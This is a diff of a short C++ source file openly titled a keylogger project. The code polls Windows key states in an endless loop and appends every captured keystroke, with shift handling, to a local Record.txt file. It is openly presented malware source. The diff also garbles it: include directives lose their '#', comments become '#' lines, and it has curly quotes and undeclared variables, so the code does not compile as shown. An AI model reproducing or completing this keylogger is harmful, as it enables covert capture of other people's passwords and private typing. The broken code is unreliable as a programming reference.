@@ -1,23 +1,23 @@
-C++ Project 
-( for (;;) creates an infinite loop)
-#include <iostream>
-#include <windows.h>
-#include <Winuser.h>
-#include <fstream>
+# C++ Keylogger Project 
+
+# ( for (;;) creates an infinite loop)
+include <iostream>
+include <windows.h>
+include <Winuser.h>
+include <fstream>
 
 void log()
-int main ()
-
-
+int main()
 
 for(;;)
    {
-     Sleep(0); //will pause the program for certain amount of milliseconds. 
+     Sleep(0); 
+     #will pause the program for certain amount of milliseconds. 
      for( key=8; key <=222; key++)
         {
-                if (GetAsyncKeyState(key) == -32767)
-                { 
-                   ofstream write ( “Record.txt”, ios :: app);
+           if (GetAsyncKeyState(key) == -32767)
+              { 
+                ofstream write ( “Record.txt”, ios :: app);
                    if ( ( key>64) && (key<91) && !(GetAsyncKeyState(0x10)) )
                       { 
                            key+= 32;
@@ -28,8 +28,8 @@ for(;;)
                    else if ((key >64) && (key<91))
                       {
                         write << key;
-                         write.close();
-                          break;
+                        write.close();
+                        break;
                        }
                    else
                     {
@@ -38,7 +38,8 @@ for(;;)
                             
 
                           {
-                               case 48: //ascii for 0
+                               case 48: 
+                               #ascii for 0
                                 { 
                                     if (GetAsyncKeyState(0x10) )
                                          write << “)”;
